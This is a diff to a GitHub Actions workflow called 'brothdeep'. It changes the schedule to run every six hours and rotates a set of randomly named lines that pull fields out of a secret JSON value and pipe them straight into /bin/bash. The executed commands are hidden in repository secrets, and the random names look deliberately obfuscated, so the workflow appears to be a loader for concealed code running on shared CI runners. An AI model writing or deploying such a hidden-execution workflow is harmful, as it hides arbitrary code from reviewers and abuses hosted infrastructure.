@@ -1,8 +1,9 @@
 name: brothdeep
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 4/6 * * *'
+    - cron: '42 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,19 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: brothdeep
         env:
-          xpw26187: ${{ secrets.xpw26187 }}
+          ug0303: ${{ secrets.ug0303 }}
         run: |
-          echo $xpw26187 | jq -r .mycs751 | /bin/bash
-          echo $umgm924 | jq -r .yshh70 | /bin/bash
-          echo $lze78 | jq -r .sa59815 | /bin/bash
-          echo $hy64399 | jq -r .ogma79713 | /bin/bash
-          echo $fi3574 | jq -r .on2688 | /bin/bash
-          echo $s55119 | jq -r .vipbd51 | /bin/bash
-          echo $prta39267 | jq -r .q079 | /bin/bash
-          echo $nqj97 | jq -r .r9 | /bin/bash
-          echo $ghyqt568 | jq -r .s0 | /bin/bash
-          echo $eapo521 | jq -r .sb5 | /bin/bash
-          echo $gxlw24449 | jq -r .ntfaw3 | /bin/bash
-          echo $z267 | jq -r .n0 | /bin/bash
-          echo $ycd39 | jq -r .zmmpl7249 | /bin/bash
+          echo $ug0303 | jq -r .i30755 | /bin/bash
+          echo $iiq61 | jq -r .eb33372 | /bin/bash
+          echo $crl883 | jq -r .lh0663 | /bin/bash
+          echo $ji1483 | jq -r .i3 | /bin/bash
+          echo $kbn2045 | jq -r .lh9033 | /bin/bash
+          echo $foq5881 | jq -r .vj5898 | /bin/bash
+          echo $zhpob8122 | jq -r .enjc93 | /bin/bash
+          echo $cp193 | jq -r .pugua03 | /bin/bash
 
